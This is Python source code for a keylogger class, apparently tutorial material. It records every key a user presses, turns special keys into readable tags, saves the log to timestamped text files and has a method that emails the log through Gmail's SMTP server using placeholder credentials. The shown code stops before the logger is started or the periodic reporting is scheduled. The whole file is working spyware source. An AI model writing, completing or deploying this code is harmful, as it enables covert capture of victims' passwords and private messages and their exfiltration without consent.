# Import needed modules
import keyboard
import smtplib
from threading import Timer
from datetime import datetime

# initialize parameters
SEND_REPORT_EVERY = 60 # in seconds
EMAIL_ADDRESS = "youremail@gmail.com"
EMAIL_PASSWORD = "yourpassword"



class keyLogger():
    """

    """

    def __init__(self, time_interval, report_method="email"):
        # Pass SEND_REPORT_EVERY to tinm_interval
        self.time_interval = time_interval
        self.report_method = report_method

        # this is the string variable that contains the log of all
        # the keystrokes within `self.interval`
        self.log = ""

        # record start & end dates
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()



    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "

            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"

            elif name == "decimal":
                name = "."

            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        # finally, add the key name to our global `self.log` variable
        self.log += name



    def update_filename(self):
        # construct the filename to be identified by start & end datetimes
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"



    def report_to_file(self):
        """This method creates a log file in the current directory that contains
        the current keylogs in the `self.log` variable"""
        # open the file in write mode (create it)
        with open(f"{self.filename}.txt", "w") as f:
            # write the keylogs to the file
            print(self.log, file=f)

        print(f"[+] Saved {self.filename}.txt")



    def send_email(self, email, password, message):
        # manages a connection to the SMTP server
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        # connect to the SMTP server as TLS mode ( for security )
        server.starttls()
        # login to the email account
        server.login(email, password)
        # send the actual message
        server.sendmail(email, email, message)
        # terminates the session
        server.quit()



